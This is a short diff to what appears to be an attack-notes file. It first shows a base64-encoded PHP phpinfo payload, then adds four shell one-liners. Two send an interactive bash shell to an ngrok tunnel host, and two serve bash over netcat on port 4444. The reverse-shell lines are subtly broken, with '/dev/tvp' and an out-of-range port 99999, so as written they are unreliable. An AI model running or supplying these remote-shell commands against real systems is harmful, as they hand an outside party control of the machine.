@@ -20,3 +20,10 @@ cat phpinfo.txt | base64
 PD9waHAgcGhwaW5mbygpOyA/Pgo=
 
 echo "PD9waHAgcGhwaW5mbygpOyA/Pgo=" | base64 -d
+
+
+
+/bin/bash -c '/bin/bash -i >& /dev/tvp/0.tcp.ap.ngrok.io/99999 0>&1'
+/bin/bash -c 'nc -lvp 4444 -e /bin/bash 0>&1'
+bash -c 'bash -i >& /dev/tvp/0.tcp.ap.ngrok.io/99999 0>&1'
+bash -c 'nc -lvp 4444 -e /bin/bash 0>&1'
